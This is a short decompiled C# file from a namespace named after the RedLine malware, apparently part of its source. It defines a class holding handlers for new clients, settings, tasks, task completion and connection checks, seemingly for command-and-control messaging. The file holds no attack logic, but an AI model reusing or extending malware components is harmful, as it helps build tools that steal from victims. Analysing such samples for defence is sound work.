using System;
using System.Runtime.CompilerServices;

namespace RedLine.SharedModels;

public class ServiceArgs
{
	[CompilerGenerated]
	private readonly object object_0;

	[CompilerGenerated]
	private readonly object object_1;

	[CompilerGenerated]
	private readonly object object_2;

	[CompilerGenerated]
	private readonly object object_3;

	[CompilerGenerated]
	private readonly object object_4;

	public NewClientHandler OnNewClientRecieved
	{
		[CompilerGenerated]
		get
		{
			return (NewClientHandler)object_0;
		}
	}

	public SettingsHandler OnGetSettings
	{
		[CompilerGenerated]
		get
		{
			return (SettingsHandler)object_1;
		}
	}

	public GetTasksHandler OnGetTasks
	{
		[CompilerGenerated]
		get
		{
			return (GetTasksHandler)object_2;
		}
	}

	public TaskCompletedHandler OnTaskCompleted
	{
		[CompilerGenerated]
		get
		{
			return (TaskCompletedHandler)object_3;
		}
	}

	public OnVerifyConnectionRequested OnVerify
	{
		[CompilerGenerated]
		get
		{
			return (OnVerifyConnectionRequested)object_4;
		}
	}

	public ServiceArgs(NewClientHandler handler1, SettingsHandler handler2, GetTasksHandler handler3, TaskCompletedHandler handler4, OnVerifyConnectionRequested handler5)
	{
		object_0 = (NewClientHandler)Delegate.Combine(OnNewClientRecieved, handler1);
		object_1 = (SettingsHandler)Delegate.Combine(OnGetSettings, handler2);
		object_2 = handler3;
		object_3 = (TaskCompletedHandler)Delegate.Combine(OnTaskCompleted, handler4);
		object_4 = (OnVerifyConnectionRequested)Delegate.Combine(OnVerify, handler5);
	}
}
